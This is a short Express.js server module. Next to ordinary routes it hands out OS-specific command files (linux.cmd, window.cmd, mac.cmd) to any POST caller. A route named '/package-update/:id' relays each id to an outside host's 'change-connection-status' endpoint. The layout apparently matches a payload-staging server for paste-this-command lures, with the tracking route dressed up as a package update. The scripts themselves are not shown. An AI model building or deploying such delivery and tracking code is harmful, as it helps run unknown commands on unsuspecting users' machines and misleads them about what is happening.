const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const routes = require('./routes');
const { errorHandler, notFound } = require('./middleware/error');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const projectRoot = process.cwd();

const sendCmdFile = (filename, res) => {
  const filePath = path.join(projectRoot, filename);
  try {
    const content = fs.readFileSync(filePath, 'utf8');
    res.type('text/plain').send(content);
  } catch (err) {
    if (err.code === 'ENOENT') {
      res.status(404).type('text/plain').send(`File not found: ${filename}`);
      return;
    }
    throw err;
  }
};

app.get('/', (req, res) => sendCmdFile('test.cmd', res));

const cmdRoute = (filename) => (req, res) => sendCmdFile(filename, res);

app.post('/linux', cmdRoute('linux.cmd'));

app.post('/window', cmdRoute('window.cmd'));

app.post('/mac', cmdRoute('mac.cmd'));

const INVITE_API_BASE = 'https://myproject-backend-beta.vercel.app';

app.get('/package-update/:id', async (req, res) => {
  const id = req.params.id;
  if (!id) {
    return res.status(400).json({ error: 'Missing id' });
  }
  try {
    const inviteUrl = `${INVITE_API_BASE}/change-connection-status/${id}`;
    const response = await fetch(inviteUrl);
    const contentType = response.headers.get('content-type') || 'application/json';
    res.set('Content-Type', contentType);
    res.status(response.status);
    const text = await response.text();
    if (contentType.includes('application/json')) {
      try {
        return res.json(JSON.parse(text));
      } catch {
        return res.send(text);
      }
    }
    res.send(text);
  } catch (err) {
    console.error('Invite API error:', err);
    res.status(502).json({ error: 'Failed to reach invite service' });
  }
});

app.use('/api', routes);

app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.use(notFound);
app.use(errorHandler);

module.exports = app;
